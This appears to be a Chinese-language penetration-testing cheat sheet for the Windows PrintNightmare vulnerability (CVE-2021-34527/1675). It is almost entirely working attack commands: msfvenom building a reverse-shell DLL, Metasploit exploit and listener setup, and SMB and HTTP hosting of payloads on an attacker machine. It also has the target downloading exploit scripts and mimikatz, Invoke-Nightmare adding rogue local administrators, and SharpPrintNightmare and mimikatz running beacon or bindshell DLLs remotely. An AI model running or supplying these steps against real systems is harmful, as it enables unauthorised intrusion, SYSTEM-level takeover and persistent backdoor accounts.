  #### 检查
  	Impacket - rpcdump
	>python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
	ItWasAllADream
	>git clone https://github.com/byt3bl33d3r/ItWasAllADream
	>cd ItWasAllADream && poetry install && poetry shell
	>itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
	>docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
  #### 执行
  ##### PrintNightmare-CVE-2021-34527
	攻击机执行
	>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f dll -o evil.dll
	检测是否存在领漏洞
	>use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
	>set RHOSTS 192.168.1.190
	>set SMBUser ignite
	>set SMBPass 123
	>set DLL_PATH /
	>exploit
	监听
	>use multi/handler
	>set payload windows/x64/meterpreter/reverse_tcp
	>set LHOST 192.168.1.2
	>set LPORT 4444
	>exploit
	https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
	托管dll
	>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /root
	执行
	./CVE-2021-34527.py ignite:123@192.168.1.190 '\\192.168.1.2\share\evil.dll'
	即可获得system
	或使用powershell
	https://github.com/calebstewart/CVE-2021-1675.git
	>python3 -m http.server 80
	靶机执行>powershell wget http://192.168.1.2/CVE-2021-1675.ps1 -O \Users\Public\cve.ps1
	>powershell -ep bypass
	>Import-Module .\cve.ps1
	>Invoke-Nightmare -NewUser "harsh" -NewPassword "123" -DriverName "PrintMe"
	或使用mimikatz
	MSF监听后
	>python3 -m http.server 80
	>powershell wget http://192.168.1.2/mimikatz.exe -O \users\Public\mimikatz.exe
	>misc::printnightmare /library:\\192.168.1.2\share\evil.dll /authuser:ignite /authpassword:123 /try:50
  ##### SharpNightmare
  	https://github.com/cube0x0/CVE-2021-1675
	>python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
	>python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
	本地执行溢出
	>SharpPrintNightmare.exe C:\addCube.dll
	远程命令执行
	>SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
	>SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
  ##### Invoke-Nightmare
	本地执行溢出
  	https://github.com/calebstewart/CVE-2021-1675
	>Import-Module .\cve-2021-1675.ps1
	>Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
	>Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
	>Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
  ##### Mimikatz v2.2.0-20210709+
  	本地执行溢出
  	>misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
	远程命令执行
	>misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50